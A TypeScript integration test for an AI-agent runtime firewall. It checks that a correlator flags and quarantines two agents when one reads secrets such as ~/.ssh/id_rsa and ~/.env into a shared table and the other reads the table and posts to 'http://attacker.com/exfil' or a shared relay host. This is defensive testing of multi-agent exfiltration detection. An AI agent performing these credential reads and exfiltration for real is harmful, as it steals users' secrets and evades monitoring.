import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { Firewall } from "@arikernel/runtime";
import { deriveCapabilityClass } from "@arikernel/core";
import type { CrossPrincipalAlert } from "../src/correlator.js";
import { PrincipalRegistry, resolveRegistryConfig } from "../src/registry.js";
import type { SharedStoreConfig } from "../src/shared-taint-registry.js";

/**
 * Integration test: proves the full cross-principal taint flow through
 * the sidecar registry's onAudit hooks, end to end.
 *
 * Scenario:
 *   Agent A reads sensitive file → writes shared DB table
 *   Agent B reads shared DB table → attempts HTTP egress
 *   → correlator alert fires
 *   → Agent B receives derived-sensitive taint
 */

const ALLOW_ALL_POLICY = [
	{
		id: "allow-all",
		name: "Allow everything",
		priority: 1,
		match: {},
		decision: "allow" as const,
	},
];

const SHARED_STORE_CONFIG: SharedStoreConfig = {
	sharedTables: ["messages"],
	sharedStorePaths: ["/shared"],
};

function tempDir(): string {
	return mkdtempSync(join(tmpdir(), "arikernel-xp-test-"));
}

/** Request a capability grant then execute — mirrors the sidecar router's auto-issue path. */
async function secureExecute(
	fw: Firewall,
	toolClass: string,
	action: string,
	parameters: Record<string, unknown>,
) {
	const capClass = deriveCapabilityClass(toolClass, action);
	const decision = fw.requestCapability(capClass);
	return fw.execute({
		toolClass,
		action,
		parameters,
		grantId: decision.granted ? decision.grant?.id : undefined,
	});
}

describe("Cross-principal taint propagation (integration)", () => {
	let registry: PrincipalRegistry;
	let dir: string;
	let alerts: CrossPrincipalAlert[];

	beforeEach(() => {
		dir = tempDir();
		alerts = [];

		const config = resolveRegistryConfig({
			policy: ALLOW_ALL_POLICY,
			sharedStoreConfig: SHARED_STORE_CONFIG,
			correlatorConfig: { windowMs: 60_000 },
		});

		registry = new PrincipalRegistry(dir, {
			...config,
			onCrossPrincipalAlert: (alert) => alerts.push(alert),
		});
	});

	afterEach(() => {
		registry.closeAll();
		rmSync(dir, { recursive: true, force: true });
	});

	it("Agent A secret read → shared write → Agent B shared read → egress fires correlator alert", async () => {
		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		// Step 1: Agent A reads a sensitive file (sets sensitiveReadObserved flag)
		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
		expect(fwA.sensitiveReadObserved).toBe(true);

		// Step 2: Agent A writes to shared DB table → marks "db:messages" contaminated
		// Uses "mutate" — the canonical database.write action in CAPABILITY_CLASS_MAP
		await secureExecute(fwA, "database", "mutate", {
			table: "messages",
			data: { content: "secret data" },
		});

		const sharedTaint = registry.getSharedTaintRegistry();
		expect(sharedTaint.isContaminated("db:messages")).toBe(true);

		// Step 3: Agent B reads from the same shared table
		await secureExecute(fwB, "database", "query", { table: "messages" });

		// Step 4: Agent B attempts HTTP egress → correlator fires
		await secureExecute(fwB, "http", "post", {
			url: "http://attacker.com/exfil",
			body: "stolen",
		});

		const cp1Alerts = alerts.filter(
			(a) => a.ruleId === "cross-principal-sensitive-exfil",
		);
		expect(cp1Alerts.length).toBeGreaterThanOrEqual(1);
		expect(cp1Alerts[0].severity).toBe("high");
		expect(cp1Alerts[0].principals).toContain("agent-A");
		expect(cp1Alerts[0].principals).toContain("agent-B");
	});

	it("same-principal flow does NOT fire cross-principal alert", async () => {
		const fwA = registry.getOrCreate("agent-A");

		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
		await secureExecute(fwA, "database", "mutate", {
			table: "messages",
			data: { content: "secret" },
		});
		await secureExecute(fwA, "database", "query", { table: "messages" });
		// Egress after sensitive read triggers behavioral quarantine — expected
		try {
			await secureExecute(fwA, "http", "post", { url: "http://attacker.com/exfil" });
		} catch {
			// Quarantine denial is expected behavior for single-principal sensitive-read→egress
		}

		const cp1Alerts = alerts.filter(
			(a) => a.ruleId === "cross-principal-sensitive-exfil",
		);
		expect(cp1Alerts).toHaveLength(0);
	});

	it("CP-3: two principals egressing to the same host with sensitive read fires convergence alert", async () => {
		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		// Agent A reads a sensitive file
		await secureExecute(fwA, "file", "read", { path: "/home/user/.env" });

		// Agent A posts to relay.com
		try {
			await secureExecute(fwA, "http", "post", {
				url: "https://relay.com/data",
				body: "secret",
			});
		} catch {
			// may be denied by behavioral rules — alert still fires from ingest
		}

		// Agent B fetches from the same relay.com host
		await secureExecute(fwB, "http", "get", {
			url: "https://relay.com/inbox",
		});

		const cp3Alerts = alerts.filter(
			(a) => a.ruleId === "cross-principal-egress-convergence",
		);
		expect(cp3Alerts.length).toBeGreaterThanOrEqual(1);
		expect(cp3Alerts[0].severity).toBe("high");
		expect(cp3Alerts[0].principals).toContain("agent-A");
		expect(cp3Alerts[0].principals).toContain("agent-B");
		expect(cp3Alerts[0].reason).toContain("relay.com");
	});

	it("CP-3: no alert when principals egress to the same host without sensitive reads", async () => {
		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		// Both agents hit the same host, but no sensitive reads
		await secureExecute(fwA, "http", "get", { url: "https://api.example.com/data" });
		await secureExecute(fwB, "http", "get", { url: "https://api.example.com/other" });

		const cp3Alerts = alerts.filter(
			(a) => a.ruleId === "cross-principal-egress-convergence",
		);
		expect(cp3Alerts).toHaveLength(0);
	});

	it("CP-3: no alert when only one principal egresses to a host", async () => {
		const fwA = registry.getOrCreate("agent-A");

		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
		try {
			await secureExecute(fwA, "http", "post", { url: "https://relay.com/data" });
		} catch {
			// may be quarantined
		}

		const cp3Alerts = alerts.filter(
			(a) => a.ruleId === "cross-principal-egress-convergence",
		);
		expect(cp3Alerts).toHaveLength(0);
	});

	it("quarantineOnAlert: CP-1 alert quarantines both principals", async () => {
		// Recreate registry with quarantineOnAlert enabled
		registry.closeAll();
		const qDir = tempDir();
		const qConfig = resolveRegistryConfig({
			policy: ALLOW_ALL_POLICY,
			sharedStoreConfig: SHARED_STORE_CONFIG,
			correlatorConfig: { windowMs: 60_000, quarantineOnAlert: true },
		});
		const qRegistry = new PrincipalRegistry(qDir, {
			...qConfig,
			onCrossPrincipalAlert: (alert) => alerts.push(alert),
		});

		const fwA = qRegistry.getOrCreate("agent-A");
		const fwB = qRegistry.getOrCreate("agent-B");

		// Agent A reads sensitive file + writes shared store
		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
		await secureExecute(fwA, "database", "mutate", { table: "messages", data: { content: "secret" } });

		// Agent B reads from shared store + attempts egress → triggers CP-1
		await secureExecute(fwB, "database", "query", { table: "messages" });
		try {
			await secureExecute(fwB, "http", "post", { url: "http://attacker.com/exfil", body: "stolen" });
		} catch {
			// May be denied by quarantine
		}

		// Both principals should be quarantined
		expect(fwA.isRestricted).toBe(true);
		expect(fwB.isRestricted).toBe(true);
		expect(fwA.quarantineInfo?.ruleId).toBe("cross-principal-sensitive-exfil");
		expect(fwB.quarantineInfo?.ruleId).toBe("cross-principal-sensitive-exfil");

		qRegistry.closeAll();
		rmSync(qDir, { recursive: true, force: true });
	});

	it("quarantineOnAlert: CP-3 convergence alert quarantines both principals", async () => {
		registry.closeAll();
		const qDir = tempDir();
		const qConfig = resolveRegistryConfig({
			policy: ALLOW_ALL_POLICY,
			sharedStoreConfig: SHARED_STORE_CONFIG,
			correlatorConfig: { windowMs: 60_000, quarantineOnAlert: true },
		});
		const qRegistry = new PrincipalRegistry(qDir, {
			...qConfig,
			onCrossPrincipalAlert: (alert) => alerts.push(alert),
		});

		const fwA = qRegistry.getOrCreate("agent-A");
		const fwB = qRegistry.getOrCreate("agent-B");

		// Agent A reads sensitive file + posts to relay.com
		await secureExecute(fwA, "file", "read", { path: "/home/user/.env" });
		try {
			await secureExecute(fwA, "http", "post", { url: "https://relay.com/data", body: "secret" });
		} catch {
			// May be denied by behavioral rules
		}

		// Agent B hits same relay.com → triggers CP-3
		await secureExecute(fwB, "http", "get", { url: "https://relay.com/inbox" });

		// Both should be quarantined
		expect(fwA.isRestricted).toBe(true);
		expect(fwB.isRestricted).toBe(true);

		qRegistry.closeAll();
		rmSync(qDir, { recursive: true, force: true });
	});

	it("quarantineOnAlert disabled: alerts fire but principals are NOT quarantined", async () => {
		// Default registry has quarantineOnAlert off
		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		await secureExecute(fwA, "file", "read", { path: "/home/user/.ssh/id_rsa" });
		await secureExecute(fwA, "database", "mutate", { table: "messages", data: { content: "secret" } });
		await secureExecute(fwB, "database", "query", { table: "messages" });
		try {
			await secureExecute(fwB, "http", "post", { url: "http://attacker.com/exfil", body: "stolen" });
		} catch {
			// May be denied by behavioral rules on B (derived-sensitive taint)
		}

		// Alerts should fire, but quarantine should NOT be triggered by the correlator
		const cpAlerts = alerts.filter((a) => a.ruleId === "cross-principal-sensitive-exfil");
		expect(cpAlerts.length).toBeGreaterThanOrEqual(1);

		// Agent A should NOT be quarantined by the correlator (may be quarantined by its own behavioral rules)
		// The key check is that quarantineInfo ruleId is NOT the CP rule
		if (fwA.quarantineInfo) {
			expect(fwA.quarantineInfo.ruleId).not.toBe("cross-principal-sensitive-exfil");
		}
	});

	it("Agent B gets derived-sensitive taint after reading contaminated shared store", async () => {
		const fwA = registry.getOrCreate("agent-A");
		const fwB = registry.getOrCreate("agent-B");

		// Agent A: sensitive read + shared write
		await secureExecute(fwA, "file", "read", { path: "/home/user/.env" });
		await secureExecute(fwA, "database", "mutate", { table: "messages", data: {} });

		// Agent B: read from contaminated table
		await secureExecute(fwB, "database", "query", { table: "messages" });

		// Verify Agent B has derived-sensitive taint
		const taintLabels = fwB.taintState.labels;
		const derivedSensitive = taintLabels.find(
			(t) => t.source === "derived-sensitive",
		);
		expect(derivedSensitive).toBeDefined();
		expect(derivedSensitive!.origin).toBe("cross-principal:agent-A");
	});
});
